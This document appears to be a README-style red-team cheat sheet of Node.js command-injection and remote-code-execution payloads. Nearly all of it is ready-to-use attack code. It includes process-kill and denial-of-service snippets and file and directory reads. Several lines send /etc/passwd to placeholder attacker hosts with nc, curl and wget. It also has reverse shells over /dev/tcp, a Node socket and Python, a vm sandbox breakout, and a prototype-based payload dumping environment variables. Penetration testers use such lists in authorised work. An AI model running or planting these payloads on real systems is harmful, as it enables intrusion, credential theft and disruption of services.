# NodeJS Red Team Cheat Sheet

A curated list of NodeJs Command Injection / RCE Payloads.

### Know the evil functions
`eval()`,`setTimeout()`,`setInterval()`, `Function()`, `unserialize()`

### Know your weapons
`fs` , `child_process`, `net`, `http`

`spawn` = returns a stream, returns huge binary data to Node

`exec` = returns a buffer, should be used to return status

### Attack Vectors

Denial of Service
```javascript
while(1)
```
Exit the running process
```javascript
process.exit()
```

Kill Process
```javascript
process.kill(process.pid)
```

Read current working directory
```javascript
res.end(require('fs').readdirSync('.').toString())
```

Read previous directory
```javascript
res.end(require('fs').readdirSync('..').toString())
```

Read file
```javascript
res.end(require('fs').readFileSync(fname))
```
Spawn Magic ( by [@aaditya_purani](https://twitter.com/aaditya_purani))
```javascript
require('child_process').spawn('ls',['-a']).stdout.on('data', function (data) {console.log('own'+ data); });
```
Child exec ( by [@artsploit](https://twitter.com/artsploit) )
```javascript
require('child_process').exec('cat+/etc/passwd+|+nc+attackerip+80')
```

```javascript
require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/nc_host/nc_port+0>%261"')
```

```javascript
require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+attackersip.com')
```
Wget post data (by [@brutelogic](https://twitter.com/brutelogic))
```javascript
require('child_process').exec('wget+--post-data+"x=$(cat+/etc/passwd)"+HOST')
```

Using net (by [ibreak.software](http://ibreak.software))
```javascript
var+net+=+require("net"),+sh+=+require("child_process").exec("/bin/bash");var+client+=+new+net.Socket();client.connect(80,+"attackerip",+function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
```

Using arguments[1] as response object (by [@OrhanAlbay](https://twitter.com/OrhanAlbay))
```javascript
arguments[1].end(require('child_process').execSync('whoami'))
```
```javascript
arguments[1].end(require('child_process').execSync('cat /etc/passwd'))
```

Bypass stream limits by compressing to gzip (by [@aaditya_purani](https://twitter.com/aaditya_purani))
```javascript
const pwn=require('zlib').createGzip();const inx=require('fs').createReadStream('app.json');const oux = require('fs').createWriteStream('unrestrictive.gz');inx.pipe(pwn).pipe(oux)
```

Sandbox Bypass spawnSync (by [netspi](https://t.co/3D9kWREcUz))
```javascript
var resp = spawnSync('python',
['-c',
'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("127.0.0.1",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
]
);
print(resp.stdout);
print(resp.stderr);
```

vm module breakout (by [pwnisher](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html))

```javascript
"use strict";
const vm = require("vm");
const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()`);
console.log(xyz);
```

Alternative RCE payload (by [mahmoud](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html))

```javascript
x = ''
myToString = x.toString.bind("console.log(process.env)")
myToStringArr = Array(myToString)
myToStringDescriptor = Object.getOwnPropertyDescriptor(myToStringArr, 0)
Object.defineProperty(Object.prototype, "toString", myToStringDescriptor)
Object.constructor("test", this)()
```

### Need More ?
Repository would be maintained time to time. Feel free to contribute.

### Contact
[@aaditya_purani](https://twitter.com/aaditya_purani)
